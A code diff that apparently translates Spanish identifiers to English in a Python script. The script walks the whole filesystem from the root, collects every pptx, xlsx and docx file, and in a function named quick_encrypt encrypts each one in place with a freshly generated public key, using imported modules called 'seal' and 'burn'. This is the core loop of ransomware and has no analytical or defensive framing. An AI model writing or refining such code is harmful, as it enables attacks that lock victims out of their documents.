@@ -1,8 +1,8 @@
 import os
 import fnmatch
 
-extensiones = ["pptx","xlsx","docx"]
-origen = "/"
+extensions = ["pptx","xlsx","docx"]
+source = "/"
 def find_files()->list[str]:
     """
     Iterate through the system files in order to find files that have extensions of
@@ -10,13 +10,13 @@ def find_files()->list[str]:
     The search for files is recursive, and the starting point is by default the root
     of the system.
     """
-    archivos_encontrados = []
-    for ruta_actual, directorios, archivos in os.walk(origen):
-        for archivo in archivos:
-            for extension in extensiones:
-                if fnmatch.fnmatch(archivo, f'*.{extension}'):
-                    archivos_encontrados.append(os.path.join(ruta_actual, archivo))
-    return archivos_encontrados
+    found_files = []
+    for route, dirs, files in os.walk(source):
+        for file in files:
+            for extension in extensions:
+                if fnmatch.fnmatch(file, f'*.{extension}'):
+                    found_files.append(os.path.join(route, file))
+    return found_files
 
 def quick_encrypt():
     """
@@ -28,8 +28,8 @@ def quick_encrypt():
     import seal
     import burn 
     priv_key,pub_key=seal.volatile_key()
-    for ruta_actual, directorios, archivos in os.walk(origen):
-        for archivo in archivos:
-            for extension in extensiones:
-                if fnmatch.fnmatch(archivo, f'*.{extension}'):
-                    burn.fast_encrypt(os.path.join(ruta_actual,archivo),pub_key)
+    for rute, dirs, files in os.walk(source):
+        for file in files:
+            for extension in extensions:
+                if fnmatch.fnmatch(file, f'*.{extension}'):
+                    burn.fast_encrypt(os.path.join(rute,file),pub_key)
